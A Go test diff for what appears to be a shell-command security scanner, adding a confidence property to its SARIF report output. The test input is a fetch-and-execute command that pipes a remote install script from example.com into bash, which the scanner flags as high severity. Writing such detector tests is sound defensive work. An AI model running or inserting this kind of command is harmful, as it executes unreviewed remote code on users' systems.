@@ -7,9 +7,10 @@ import (
 
 func TestSARIFReportShape(t *testing.T) {
 	raw := SARIFReport("bash -c \"$(curl -fsSL https://example.com/install.sh)\"", []Finding{{
-		Kind:     "fetch-in-command-substitution",
-		Severity: SeverityHigh,
-		Message:  "Remote content executed via command substitution",
+		Kind:       "fetch-in-command-substitution",
+		Severity:   SeverityHigh,
+		Confidence: ConfidenceHigh,
+		Message:    "Remote content executed via command substitution",
 	}})
 
 	b, err := json.Marshal(raw)
@@ -20,8 +21,9 @@ func TestSARIFReportShape(t *testing.T) {
 		Version string `json:"version"`
 		Runs    []struct {
 			Results []struct {
-				RuleID string `json:"ruleId"`
-				Level  string `json:"level"`
+				RuleID     string            `json:"ruleId"`
+				Level      string            `json:"level"`
+				Properties map[string]string `json:"properties"`
 			} `json:"results"`
 		} `json:"runs"`
 	}
@@ -39,5 +41,8 @@ func TestSARIFReportShape(t *testing.T) {
 	}
 	if doc.Runs[0].Results[0].Level != "error" {
 		t.Fatalf("unexpected level %q", doc.Runs[0].Results[0].Level)
+	}
+	if doc.Runs[0].Results[0].Properties["confidence"] != "high" {
+		t.Fatalf("unexpected confidence property: %#v", doc.Runs[0].Results[0].Properties)
 	}
 }
